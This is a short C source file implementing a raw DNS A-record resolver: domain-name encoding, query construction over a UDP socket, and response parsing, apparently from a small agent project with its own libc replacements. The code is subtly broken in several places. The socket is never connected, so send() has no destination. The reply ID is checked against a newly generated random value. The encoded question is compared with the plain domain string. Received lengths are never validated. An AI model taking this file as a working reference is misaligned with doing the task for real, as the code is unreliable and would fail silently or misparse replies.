#include "Dns.h"
#include "../Common/ministd.h"
#include "../Common/shaco_stdlib.h"
#include "../Common/Network.h"

void encode_domain_name(unsigned char* encoded, const char* domain) {
    int i, j = 0, k = -1;
    for (i = 0; domain[i] != '\0'; i++) {
        if (domain[i] == '.') {
            encoded[k] = i - k - 1;
            k = i;
        } else {
            encoded[i+1] = domain[i];
        }
    }
    encoded[k] = i - k - 1;
    encoded[i+1] = '\0';
}

void receive_dns_response(int fd,const char domain[256], char *ip){
    unsigned char buf[512];
    MemSet(buf, 0, 512);

    int len = recv(fd, buf, 512, 0);

    dns_header_t* header = (dns_header_t*)buf;
    if (ntohs(header->id) != generate_random_int(5, 10)) 
        return;
    

    if (header->qr != 1 || header->opcode != 0 || header->ancount == 0) {
        return;
    }

    unsigned char* question = buf + sizeof(dns_header_t);
    unsigned char* answer = question + StringLength((char*)question) + 1 + sizeof(dns_question_t);

    if (StringCompare(domain, (char*)question) != 0)
        return;
    

    dns_answer_t* ans = (dns_answer_t*)answer;
    if (ans->type == htons(1) && ans->class == htons(1) && ans->rdlength == 4) {
        struct in_addr addr;
        CopyMemory(&addr, ans->rdata, 4);
        StringCopy(ip, inet_ntoa(addr));
    } else {
        return;
    }
}

void send_dns_query(int fd,const char domain[256]){
    unsigned char buf[512];
    MemSet(buf, 0, 512);

    dns_header_t* header = (dns_header_t*)buf;
    header->id = s_htons(generate_random_int(5, 10));
    header->qr = 0;
    header->opcode = 0;
    header->rd = 1;
    header->qdcount = s_htons(1);

    unsigned char* question = buf + sizeof(dns_header_t);
    encode_domain_name(question, domain);

    dns_question_t* qinfo = (dns_question_t*)(question + StringLength((char*)question) + 1);
    qinfo->type = htons(1); 
    qinfo->class = htons(1);

    int len = sizeof(dns_header_t) + StringLength((char*)question) + 1 + sizeof(dns_question_t);
    send(fd, buf, len, 0);
}

char* s_resolve_dns(const char* domain, char ipdns[16]){
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP );
    if(sock < 0) return NULL;
    struct sockaddr_in addr;
    ZeroMemory(&addr, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = s_htons(DNSPORT);
    addr.sin_addr.s_addr = s_inet_addr(ipdns);
    send_dns_query(sock, domain);

    char *ip = shaco_malloc(16);
    receive_dns_response(sock, domain, ip);
    return ip;
}
